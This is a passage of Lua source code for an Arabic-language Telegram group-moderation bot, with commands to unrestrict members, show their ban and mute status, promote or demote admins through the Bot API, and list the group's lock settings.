https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء تقييده'
texts = usertext..status
else
texts = '⚠┇ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء تقييده'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇ العضو » '..userid..''
status  = '\n☑️┇ تم الغاء تقييده'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match('^رفع القيود @(.*)') and Manager(msg) then 
local username = text:match('^رفع القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if SudoBot(msg) then
database:srem(bot_id..'GBan:User',result.id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
usertext = '\n👤┇العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء القيود عنه'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
usertext = '\n👤┇العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء القيود عنه'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
end
else
Text = '📥┇المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "رفع القيود" and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if SudoBot(msg) then
database:srem(bot_id..'GBan:User',result.sender_user_id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم الغاء القيود عنه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم الغاء القيود عنه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match('^كشف القيود @(.*)') and Manager(msg) then 
local username = text:match('^كشف القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
Textt = "📑┇ الحظر العام » "..GBan.."\n🚫┇ الحظر » "..Ban.."\n📮┇ الكتم » "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
else
Text = '⚠️┇ المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end

if text == "كشف القيود" and Manager(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.sender_user_id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
if database:sismember(bot_id..'Gmute:User',result.sender_user_id_) then
Gmute = 'محظور عام'
else
Gmute = 'غير محظور عام'
end
Textt = "܁༯┆هلو عمري  ↝ ܰ\n܁༯┆قيود العضو كالاتي ▿  ܰ\n••━━━━━━━━━━━━━━━━••\n܁༯┆الحظر العام ˼ "..GBan.." ˹\n܁༯┆الحظر  ˼ "..Ban.." ˹\n܁༯┆الكتم  ˼ "..Muted.." ˹"
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text == ("رفع ادمن بالكروب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن بالكروب ↝ ܰ '
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن بالكروب @(.*)$") and Constructor(msg) then
local username = text:match("^رفع ادمن بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن بالكروب ?? ܰ '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل ادمن بالكروب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ادمن بالكروب ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن بالكروب @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل ادمن بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ادمن بالكروب ↝ ܰ'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end


if text == ("رفع ادمن بكل الصلاحيات") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن بكل الصلاحيات ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن بكل الصلاحيات @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع ادمن بكل الصلاحيات @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن بكل الصلاحيات ↝ ܰ'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل ادمن بكل الصلاحيات") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ادمن بكل الصلاحيات ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن بكل الصلاحيات @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل ادمن بكل الصلاحيات @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ادمن بكل الصلاحيات ↝ ܰ'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text == "اعدادات المجموعه" and Mod(msg) then    
if database:get(bot_id..'lockpin'..msg.chat_id_) then    
lock_pin = '✓'
else 
lock_pin = '✘'    
end
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then    
lock_tagservr = '✓'
else 
lock_tagservr = '✘'    
end
if database:get(bot_id..'lock:text'..msg.chat_id_) then    
lock_text = '✓'
else 
lock_text = '✘'    
end
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
lock_add = '✓'
else 
lock_add = '✘'    
end    
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
lock_join = '✓'
else 
lock_join = '✘'    
end    
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit = '✓'
else 
lock_edit = '✘'    
end
print(welcome)
if database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_) then
welcome = '✓'
else 
welcome = '✘'    
end
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit_med = '✓'
else 
lock_edit_med = '✘'    
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = 'بالطرد 🚷'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = 'بالتقيد 🔏'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = 'بالكتم 🔇'           
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = 'بالمسح ⚡'           
else     
flood = '✘'     
end
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
lock_photo = '✓' 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = 'بالتقيد 🔏'   
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = 'بالطرد 🚷'   
else
lock_photo = '✘'   
end    
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
lock_phon = '✓' 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = 'بالطرد 🚷'    
else
lock_phon = '✘'    
end    
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" then
lock_links = '✓'
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد 🚷'    
else
lock_links = '✘'    
end
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = '✓'
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم 🔇'   
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد ??'    
else
lock_cmds = '✘'    
end
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = '✓'
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد 🚷'    
else
lock_user = '✘'    
end
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = '✓'
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد 🚷'    
else
lock_hash = '✘'    
end
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_muse = '✓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = 'بالطرد 🚷'    
else
lock_muse = '✘'    
end 
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
lock_ved = '✓'
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = 'بالطرد 🚷'    
else
lock_ved = '✘'    
end
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
lock_gif = '✓'
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = 'بالطرد 🚷'    
else
lock_gif = '✘'    
end
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = '✓'
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = 'بالطرد 🚷'    
else
lock_ste = '✘'    
end
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
lock_geam = '✓'
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = 'بالطرد 🚷'    
else
lock_geam = '✘'    
end    
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_vico = '✓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = 'بالطرد 🚷'    
else
lock_vico = '✘'    
end    
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = '✓'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = 'بالتقيد 🔏'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = 'بالطرد 🚷'
else
lock_inlin = '✘'
end
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
lock_fwd = '✓'
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = 'بالطرد 🚷'    
else
lock_fwd = '✘'    
end    
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
lock_file = '✓'
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then 
lock_file = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then 
lock_file = 'بالطرد ??'    
else
lock_file = '✘'    
end    
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = '✓'
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = 'بالطرد 🚷'    
else
lock_self = '✘'    
end
if database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = '✓'
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد 🔏'   
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد 🚷'    
else
lock_bots = '✘'    
end
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = '✓'
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = 'بالكتم 🔇'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = 'بالطرد 🚷'    
else
lock_mark = '✘'    
end
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = '✓'
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد 🔏'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم ??'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد 🚷'    
else
lock_spam = '✘'    
end        
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
rdmder = '✓'
else
rdmder = '✘'
end
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
rdsudo = '✓'
else
rdsudo = '✘'
end
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
idgp = '✓'
else
idgp = '✘'
end
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then
idph = '✓'
else
idph = '✘'
end
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
setadd = '✓'
else
setadd = '✘'
end
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
banm = '✓'
else
banm = '✘'
end
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
addme = '✓'
else
addme = '✘'
end
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
sehuser = '✓'
else
sehuser = '✘'
end
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
kickme = '✓'
else
kickme = '✘'
end
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
'\n🔰┇اعدادات المجموعه كتالي √↓'..
'\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n☑️┇ علامة ال {✓} تعني معطل'..
'\n☑️┇ علامة ال {✘} تعني مفعل'..
'\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n📌┇ الروابط ← { '..lock_links..
' }\n'..'📌┇ المعرفات ← { '..lock_user..
' }\n'..'📌┇ التاك ← { '..lock_hash..
' }\n'..'📌┇ البوتات ← { '..lock_bots..
' }\n'..'📌┇التوجيه ← { '..lock_fwd..
' }\n'..'📌┇التثبيت ← { '..lock_pin..
' }\n'..'📌┇ الاشعارات ← { '..lock_tagservr..
' }\n'..'📌┇ الماركدون ← { '..lock_mark..
' }\n'..'📌┇ التعديل ← { '..lock_edit..
' }\n'..'📌┇ تعديل الميديا ← { '..lock_edit_med..
' }\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n'..'☑️┇ الكلايش ← { '..lock_spam..
' }\n'..'☑️┇ الكيبورد ← { '..lock_inlin..
' }\n'..'☑️┇ الاغاني ← { '..lock_vico..
' }\n'..'☑️┇ المتحركه ← { '..lock_gif..
' }\n'..'☑️┇ الملفات ← { '..lock_file..
' }\n'..'☑️┇ الدردشه ← { '..lock_text..
' }\n'..'☑️┇ الفيديو ← { '..lock_ved..
' }\n'..'☑️┇ الصور ← { '..lock_photo..
' }\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n'..'🔖┇ الصوت ← { '..lock_muse..
' }\n'..'🔖┇ الملصقات ← { '..lock_ste..
